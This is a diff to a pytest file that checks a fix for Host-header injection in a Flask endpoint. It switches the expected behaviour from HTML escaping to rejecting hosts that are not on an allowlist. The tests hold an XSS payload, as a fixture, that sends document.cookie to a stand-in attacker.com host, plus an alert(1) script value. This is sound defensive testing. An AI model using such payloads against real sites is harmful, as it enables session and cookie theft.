@@ -5,17 +5,18 @@ Attack vector: POST /api/hhivuln with a crafted Host header containing
 HTML/JS that breaks out of the <a href='...'> attribute context.
 
 On the vulnerable code  → h is interpolated raw into the HTML response.
-On the fixed code       → html.escape(h) neutralises <, >, ', ", & before
-                          they reach the browser's HTML parser.
+On the fixed code       → Host is validated against ALLOWED_HOSTS; unknown
+                          hosts are rejected with 400 before any reflection.
+                          Known-good hosts are further protected by html.escape.
 """
 
 import flask
 import pytest
 
-from hhi import hhivuln
+from hhi import hhivuln, ALLOWED_HOSTS
 
 XSS_PAYLOAD = "evil.com'><script>document.location='https://attacker.com?c='+document.cookie</script><a href='"
-BENIGN_HOST = "example.com"
+BENIGN_HOST = ALLOWED_HOSTS[0]  # use a known-good host from the allowlist
 
 
 @pytest.fixture
@@ -23,13 +24,13 @@ def app():
     return flask.Flask(__name__)
 
 
-def test_xss_payload_is_escaped(app):
+def test_xss_payload_is_rejected(app):
     """
-    The XSS payload must be HTML-escaped in the response — it must NOT
-    contain raw < or > characters that a browser would parse as tags.
+    The XSS payload host is not in ALLOWED_HOSTS and must be rejected (400)
+    — it must never be reflected into the response body.
 
     This test FAILS on the vulnerable code (raw Host echoed into href)
-    and PASSES on the fixed code (html.escape applied).
+    and PASSES on the fixed code (unknown host rejected before reflection).
     """
     with app.test_request_context(
         "/api/hhivuln",
@@ -37,20 +38,14 @@ def test_xss_payload_is_escaped(app):
         headers={"Host": XSS_PAYLOAD},
     ):
         result, status = hhivuln(None)
-        msg = result["msg"]
-
-        assert status == 200
-        # html.escape must convert < > ' " & into entity references
-        assert "<script>" not in msg, f"Raw <script> tag in response! Got: {msg!r}"
-        assert "</script>" not in msg, f"Raw </script> tag in response! Got: {msg!r}"
-        # The injected single-quote that breaks out of the href must be escaped
-        assert "&#x27;" in msg or "&apos;" in msg or "&#39;" in msg, (
-            f"Single-quote not escaped in href attribute! Got: {msg!r}"
+        assert status == 400, f"XSS payload host must be rejected, got {status}"
+        assert "<script>" not in result.get("msg", ""), (
+            f"Raw <script> tag in response! Got: {result!r}"
         )
 
 
 def test_benign_host_passes_through(app):
-    """A normal Host header value is returned unmodified (no double-escaping)."""
+    """A host from ALLOWED_HOSTS is returned in the response without double-escaping."""
     with app.test_request_context(
         "/api/hhivuln",
         method="POST",
@@ -62,14 +57,14 @@ def test_benign_host_passes_through(app):
 
 
 def test_script_tag_in_host_not_reflected_raw(app):
-    """A Host containing a bare <script> tag must not appear unescaped."""
+    """A Host containing a bare <script> tag must be rejected, not reflected."""
     with app.test_request_context(
         "/api/hhivuln",
         method="POST",
         headers={"Host": "<script>alert(1)</script>"},
     ):
         result, status = hhivuln(None)
-        assert status == 200
-        assert "<script>" not in result["msg"], (
-            f"Unescaped <script> reflected! Got: {result['msg']!r}"
+        assert status == 400, f"Script-tag host must be rejected, got {status}"
+        assert "<script>" not in result.get("msg", ""), (
+            f"Unescaped <script> reflected! Got: {result!r}"
         )
